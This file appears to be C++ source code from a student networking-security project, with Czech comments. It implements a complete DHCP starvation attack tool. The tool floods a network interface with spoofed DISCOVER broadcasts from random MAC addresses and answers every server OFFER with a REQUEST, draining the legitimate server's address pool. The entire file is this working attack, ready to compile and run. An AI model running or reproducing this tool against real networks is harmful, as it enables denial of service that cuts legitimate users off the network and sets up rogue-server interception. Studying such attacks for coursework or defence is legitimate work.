/**
 * Projekt: PDS - DHCP attacks
 *
 * @file dhcpstarve.cpp
 *
 * @author David Koleckar - xkolec07
 *
 * @brief DHCP Starvation - vycerpavajici adresni pool legitimniho serveru
 */

#include "dhcpstarve.h"

void help(){
	std::cout << "PDS - DHCP STARVATION" << std::endl;
	std::cout << "Pouziti:" << std::endl;
	std::cout << "./pds-dhcpstarve -i interface " << std::endl;
	std::cout << "-interface (retezec) jmeno rozhrani" << std::endl;
}

void signalHandler(int signo){
	if (signo == SIGINT){
		exit(EXIT_SUCCESS);
	}
}

void sendRequest(unsigned int srv, unsigned int xid, unsigned int yaddr, unsigned char *chaddr, int socket){
	srand(time(NULL) ^ (getpid()<<16));
	//alokace mista pro packet
	unsigned char packet[PACKET_HLEN];
	//vytvoreni dhcp options pro discovery message
	unsigned char *request = createRequest(srv, yaddr);
	//vytvoreni structur pro packet
	struct dhcphdr *dhcp = createDHCP(chaddr, ntohl(xid),1,0,0);
	struct udphdr *udp = createUDP(DHCP_HLEN+REQ_HLEN,68,67);	
	struct iphdr *ip = createIP(UDP_HLEN+DHCP_HLEN+REQ_HLEN, 0, inet_addr("255.255.255.255"));
	
	//nastaveni mac adres
	unsigned char edst[ETH_ALEN];
	memset(edst, 0xff, ETH_ALEN);
	unsigned char esrc[ETH_ALEN];	
	randomMac(esrc);
	struct ethhdr *eth = createEther(esrc,edst);	

	//tvorba packetu
	memcpy(packet, eth, ETH_HLEN);
	memcpy(packet + ETH_HLEN, ip, IP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN, udp, UDP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN, dhcp, DHCP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN + DHCP_HLEN, request, REQ_HLEN);
	//odeslani requestu
	if(send(socket, packet, 298, 0) == -1){
		printEcode(ESEND);
		exit(EXIT_FAILURE);
	}

	free(request);

}

void sendDiscover(const char *iface){

	srand(time(0));
	//vytvoreni socketu
	int sockk = createSocket();
	//bind
	bindSocket(sockk,iface);

	//generovani nahodne mac
	unsigned char randMac[ETH_ALEN];	
	randomMac(randMac);
	//adresy src, dst eth
	unsigned char edst[ETH_ALEN];
	memset(edst, 0xff, ETH_ALEN);

	unsigned char esrc[ETH_ALEN];
	memcpy(esrc, randMac, ETH_ALEN);
	//alokace packetu
	unsigned char packet[PACKET_HLEN];

	//vytvoreni dhcp options pro discovery message
	unsigned char *discovery = createDiscover();

	//vytvoreni structur pro packet
	struct dhcphdr *dhcp = createDHCP(randMac,rand(),1,0,0);
	struct udphdr *udp = createUDP(DHCP_HLEN+DIS_HLEN,68,67);	
	struct iphdr *ip = createIP(UDP_HLEN+DIS_HLEN+DHCP_HLEN, 0, inet_addr("255.255.255.255"));
	struct ethhdr *eth = createEther(esrc,edst);

	//tvorba packetu
	memcpy(packet, eth, ETH_HLEN);
	memcpy(packet + ETH_HLEN, ip, IP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN, udp, UDP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN, dhcp, DHCP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN + DHCP_HLEN, discovery, DIS_HLEN);

	while(1){
		if(send(sockk, packet, 286, 0) == -1){
			printEcode(ESEND);
			exit(EXIT_FAILURE);
    	}
		//zmena parametru pro dalsi packet
		ip->id = rand(); 						
		ip->check = 0;   					
		ip->check = checksum(ip, IP_HLEN);

    	dhcp->xid = rand();					
		randomMac(randMac);

   		memcpy(dhcp->chaddr, randMac, ETH_ALEN);  
   		memcpy(eth->h_source, randMac, ETH_ALEN);  

   		memcpy(packet, eth, ETH_HLEN);
   		memcpy(packet + ETH_HLEN, ip, IP_HLEN); 
   		memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN, dhcp, DHCP_HLEN);

		sleep(1);
	}


	free(discovery);
	close(sockk);
}

void checkOffer(const char *iface){
	//vytvoreni socketu
	int sockReq = createSocket();
	//bind
	bindSocket(sockReq,iface);
	//velikost prijatych dat
	int recvDataLen;
	//misto pro prijaty packet
	unsigned char recvPacket[PACKET_HLEN];
	struct iphdr *recvIp = (struct iphdr *)(recvPacket + ETH_HLEN);
	struct udphdr *recvUdp;
	struct dhcphdr *recvDhcp;
	unsigned char *offer;	
	while(1){
		//prijmuti prichozich dat
		if ((recvDataLen = recv(sockReq, recvPacket, PACKET_HLEN, 0)) == -1){
			printEcode(ERECV);
			exit(EXIT_FAILURE);		
		}
		//ihl je pulbyte -> *4
		recvUdp = (struct udphdr *)(recvPacket + ETH_HLEN + recvIp->ihl*4);
		//std::cout << "velikost " << recvDataLen  << std::endl;
		recvDhcp = (struct dhcphdr *)(recvPacket + ETH_HLEN + recvIp->ihl*4 + UDP_HLEN);
		offer = (unsigned char *)(recvPacket + ETH_HLEN + recvIp->ihl*4 + UDP_HLEN + DHCP_HLEN);
		//pokud je to offer
		if(ntohs(recvUdp->source) == 67 && offer[2] == 0x02){
			//ziskani adresy z dhcp options
			unsigned int offerOptionsLen = recvDataLen - (ETH_HLEN + recvIp->ihl*4 + UDP_HLEN + DHCP_HLEN); 
			unsigned char srvIP[4];
			for(unsigned int i = 0; i<offerOptionsLen; i++){
				if(offer[i] == 0x36){
					memcpy(srvIP, &offer[i+2], 4);
					break;
				}
			}
			unsigned int srv = *(unsigned int*) srvIP;
			//vytvoreni socketu
			int sockReq2 = createSocket();
			//bind
			bindSocket(sockReq2,iface);
			//zaslani requestu
			sendRequest(srv, recvDhcp->xid, recvDhcp->yaddr, recvDhcp->chaddr, sockReq2);
			close(sockReq2);
		}

	}

	close(sockReq);
}


int main (int argc, char *argv[])
{ 
	// odchytavani signalu SIGINT
	signal(SIGINT, signalHandler);

	//prepinace pro getopt
	int opt;
	//interface
	std::string iface("");

	//zpracovani parametru
	while ((opt = getopt (argc, argv, "i:h")) != -1)
	{
		switch (opt)
		{	
			//prepinac -i (interface)
			case 'i':
				iface = std::string(optarg);
			break;
			//prepinac -h (help)
			case 'h':
				help();
				exit(EXIT_SUCCESS);
			break;
			//zadny prepinac chyba
			case '?':
				printEcode(EARG);
				exit(EXIT_FAILURE);
			break;

			default:
			break;
		}
	}

	//pokud neni zadan interface error
	if (iface.empty()){
		printEcode(EARG);
		exit(EXIT_FAILURE);
	}
	
	if (fork()){
		checkOffer(iface.c_str());
	}
	
	sendDiscover(iface.c_str());

	return EXIT_SUCCESS;
} 
